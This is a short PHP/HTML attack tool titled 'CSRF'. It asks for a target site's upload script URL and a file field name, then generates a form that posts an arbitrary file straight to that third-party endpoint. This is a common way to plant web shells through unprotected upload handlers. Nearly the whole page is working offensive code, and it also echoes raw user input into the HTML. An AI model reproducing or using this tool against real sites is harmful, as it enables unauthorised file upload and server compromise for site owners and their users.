<html>
<head>
    <title>CSRF</title>
    <style type="text/css">
        body {
            text-align: center;
            font-family: 'Arial', sans-serif;
            margin-top: 10%;
            background-color: #fff;
            color: #000;
        }
        h1 {
            font-size: 24px;
            color: #000;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
            margin-bottom: 20px;
        }
        input[type="text"] {
            margin: 10px;
            padding: 10px;
            font-size: 14px;
            border: 2px solid #000;
            border-radius: 5px;
            width: 50%;
            max-width: 400px;
            box-shadow: 2px 2px 5px rgba(0, 0, 0, 0.1);
        }
        input[type="submit"] {
            margin: 20px;
            padding: 12px 30px;
            font-size: 16px;
            background-color: #fff;
            color: #000;
            border: 2px solid #000;
            border-radius: 5px;
            cursor: pointer;
            box-shadow: 2px 2px 5px rgba(0, 0, 0, 0.1);
            transition: background-color 0.3s ease, color 0.3s ease;
        }
        input[type="submit"]:hover {
            background-color: #000;
            color: #fff;
        }
        form {
            display: block;
            margin: 0 auto;
            padding: 30px;
            background-color: #f9f9f9;
            border: 1px solid #ddd;
            border-radius: 10px;
            width: 60%;
            max-width: 500px;
            box-shadow: 3px 3px 10px rgba(0, 0, 0, 0.1);
        }
        label {
            font-size: 16px;
            color: #000;
        }
    </style>
</head>
<body>
    <form method="post">
        <h1>127.0.0.1:8080</h1>
        <label for="url">CURL: </label>
        <input type="text" name="url" id="url" placeholder="http://www.target.com/[path]/upload.php" required><br>
        <label for="pf">POST-Type: </label>
        <input type="text" name="pf" id="pf" placeholder="Filedata / files[] / qqfile / userfile / dll" required><br>
        <input type="submit" name="d" value="LOCKED">
    </form>

    <?php
    if (isset($_POST['d'])) {
        $url = $_POST['url'];
        $pf = $_POST['pf'];
        echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'>
                <input type='file' name='$pf' required>
                <input type='submit' name='g' value='root'>
              </form>";
    }
    ?>
</body>
</html>
